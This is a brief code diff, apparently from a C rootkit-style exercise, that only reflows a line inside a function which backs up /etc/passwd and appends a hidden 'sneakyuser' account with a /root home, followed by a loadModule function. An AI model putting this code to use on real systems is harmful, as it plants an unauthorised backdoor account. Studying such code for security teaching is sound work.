@@ -33,8 +33,9 @@ void executeCommand(const char *command) {
 
 void modifyFile() {
   executeCommand("cp /etc/passwd /tmp/passwd");
-  executeCommand("echo \"sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\" "
-                 ">> /etc/passwd");
+  executeCommand(
+      "echo \"sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\" "
+      ">> /etc/passwd");
 }
 
 void loadModule() {
